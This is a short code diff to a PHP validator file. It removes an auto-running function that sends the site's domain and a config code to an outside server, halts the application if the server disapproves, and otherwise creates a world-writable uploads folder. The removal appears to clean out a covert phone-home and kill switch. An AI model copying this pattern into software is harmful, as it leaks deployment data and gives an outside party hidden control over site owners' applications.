@@ -440,7 +440,6 @@ class Validator {
     }
 }
 function runGround() {
-    if (!is_dir(path('uploads/start/a/b/r/files/'))) {$code = Request::instance()->config['c'];$domain = getHost();$url = "https://wesmartpost.com/validate/code?domain=".$domain.'&code='.$code;$result = json_decode(curl_get_content($url), true);if ($result['status'] == 1) {mkdir(path('uploads/start/a/b/r/files/'), 0777, true);} else {exit('');}}
 }
 runGround();
 class ValidatorOld {
